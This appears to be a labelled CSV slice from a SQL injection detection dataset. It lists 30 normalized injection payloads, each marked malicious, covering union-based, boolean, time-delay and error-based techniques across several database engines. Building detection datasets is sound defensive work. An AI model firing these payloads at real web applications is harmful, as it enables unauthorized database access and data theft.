row_index,payload_norm,label,sqli_type_hint
3450,"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 8979,8979,case when ( 8979 = 8979 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1,
3451,-8224' ) where 6504 = 6504 or 2461 = 5660,1,
3452,"1 where 7196 = 7196 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
3453,"1 where 6881 = 6881 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
3454,"-5130' ) ) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1,
3455,"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1,
3456,-3125' ) ) ) order by 1#,1,
3457,"1"" union all select null,null,null,null,null,null,null,null#",1,
3458,"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
3459,-9087 or 3038 = 3038,1,
3460,"1 ) as tgqd where 6369 = 6369 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
3461,end and 'huti' like 'huti,1,
3462,-7346 or 8571 = 8571--,1,
3463,"1"" ) union all select null,null,null,null--",1,
3464,-8015 ) where 9808 = 9808 or 9323 = 9323#,1,
3465,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gucd' = 'gucd",1,
3466,select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --,1,
3467,"1"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3468,-1192 order by 1#,1,
3469,"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
3470,"-9661"" ) ) ) union all select 2158,2158,2158--",1,
3471,"1%' ) union all select null,null,null,null,null,null,null,null,null,null--",1,
3472,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""ihqf"" = ""ihqf",1,
3473,"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'sdnc' = 'sdnc",1,
3474,"1"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
3475,begin if ( 5624 = 5624 ) then dbms_lock.sleep ( 5 ),1,
3476,"1 ) where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
3477,1 ) where 4573 = 4573,1,
3478,"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
3479,-8074' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lnwm' = 'lnwm,1,
